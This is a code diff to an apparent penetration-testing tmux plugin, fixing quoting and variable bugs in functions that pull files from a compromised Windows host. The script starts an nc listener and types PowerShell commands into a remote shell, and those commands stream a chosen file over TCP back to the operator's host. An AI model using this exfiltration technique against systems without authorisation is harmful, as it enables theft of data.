@@ -26,7 +26,7 @@ _fetch_file() {
 
   nc_window="$(tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst\"")"
 
-  tmux send-keys -t "$pane_id" "\$FileName = $src" Enter
+  tmux send-keys -t "$pane_id" "\$FileName = \"$src\"" Enter
   tmux send-keys -t "$pane_id" '[byte[]]$buffer = New-Object byte[] 1024' Enter
   tmux send-keys -t "$pane_id" '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
   tmux send-keys -t "$pane_id" "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
@@ -53,7 +53,7 @@ _list_files() {
 
   _fetch_file "$pane_id" '$TEMP\fl.txt' "$files" "$lhost" "$lport"
 
-  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(cat "$files_list_file" | fzf --cycle --border="sharp")"
+  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(cat "$files" | fzf --cycle --border="sharp")"
   rm "$files"
 }
 
@@ -76,7 +76,7 @@ _run() {
   [[ -z "$file_to_fetch" ]] && return
 
   local dst_file="$(_windows_path_to_unix "${file_to_fetch}")"
-  dst_file="###SessionDir###Files/${file_to_fetch}"
+  dst_file="###SessionDir###Files/${dst_file}"
   dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
   dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"
 
